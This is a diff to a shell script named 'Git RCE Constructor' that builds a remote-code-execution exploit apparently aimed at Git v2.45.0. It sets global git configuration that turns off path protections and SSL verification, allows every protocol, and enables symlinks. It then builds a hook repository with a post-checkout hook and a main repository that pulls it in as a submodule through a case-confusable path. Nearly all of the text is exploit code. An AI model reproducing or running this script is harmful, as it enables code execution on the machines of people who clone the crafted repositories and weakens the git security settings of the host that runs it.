@@ -6,18 +6,31 @@ echo -n "Operation failed!"
 read -N 1
 exit -1
 }
-echo Git RCE Constructor v1.9.3 \(Local Mode\)
-echo -e "\033]0;Git RCE Constructor v1.9.3 (Local Mode)\007"
+echo Git RCE Constructor v1.9.4 \(Local Mode\)
+echo -e "\033]0;Git RCE Constructor v1.9.4 (Local Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 set -x
+git config --global protocol.allow always ||error_handler
 git config --global protocol.file.allow always ||error_handler
-git config --global core.protectNTFS false ||error_handler
+git config --global protocol.git.allow always ||error_handler
+git config --global protocol.http.allow always ||error_handler
 git config --global core.symlinks true ||error_handler
+git config --global core.protectNTFS false ||error_handler
+git config --global core.protectHFS false ||error_handler
+git config --global core.ignoreCase true ||error_handler
+git config --global core.longpaths true ||error_handler
 git config --global core.fscache false ||error_handler
 git config --global core.fsmonitor false ||error_handler
 git config --global core.preloadIndex false ||error_handler
-git config --global core.untrackedCache false ||error_handler
+git config --global core.commitGraph true ||error_handler
+git config --global core.multiPackIndex true ||error_handler
+git config --global core.hideDotFiles false ||error_handler
 git config --global http.sslVerify false ||error_handler
+git config --global receive.maxInputSize 0 ||error_handler
+git config --global receive.denyCurrentBranch updateInstead ||error_handler
+git config --global receive.denyDeletes false ||error_handler
+git config --global receive.denyDeleteCurrent false ||error_handler
+git config --global receive.denyNonFastForwards false ||error_handler
 if [ -z "$(git config --global user.name)" ]; then
 git config --global user.name "$USERNAME"
 fi
@@ -31,9 +44,6 @@ fsutil file setcasesensitiveinfo git_rce_hook disable
 fi
 git init git_rce_hook ||error_handler
 cd git_rce_hook ||error_handler
-git config receive.denyCurrentBranch updateInstead
-git config receive.denyNonFastForwards false
-git config receive.denyDeletes false
 mkdir -p scripts/hooks ||error_handler
 cat > scripts/hooks/post-checkout <<EOF
 #!/bin/bash
@@ -74,9 +84,6 @@ fsutil file setcasesensitiveinfo git_rce_main disable
 fi
 git init git_rce_main ||error_handler
 cd git_rce_main ||error_handler
-git config receive.denyCurrentBranch updateInstead
-git config receive.denyNonFastForwards false
-git config receive.denyDeletes false
 git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE ||error_handler
 git config -f .gitmodules submodule.RCE/scripts.ignore all ||error_handler
 git add .gitmodules ||error_handler
